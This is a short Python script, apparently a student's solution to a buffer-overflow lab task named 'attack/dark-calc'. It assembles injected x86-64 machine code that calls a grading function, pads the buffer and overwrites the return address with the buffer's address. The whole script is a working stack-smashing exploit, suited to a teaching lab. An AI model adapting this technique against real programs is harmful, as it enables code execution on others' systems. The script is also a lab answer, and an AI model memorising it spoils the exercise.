#!/usr/bin/env python3
"""Task 2: build the payload for attack/dark-calc.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys
import struct

grade_eval_addr = 0x401a87
buf_addr        = 0x721000800fd0

code  = b'\xbf\x04\x00\x00\x00'
code += b'\xb8' + struct.pack('<I', grade_eval_addr)
code += b'\xff\xd0'

payload  = code + b'A' * (16 - len(code))
payload += b'B' * 8
payload += struct.pack('<Q', buf_addr)
payload += b'\n'

sys.stdout.buffer.write(payload)
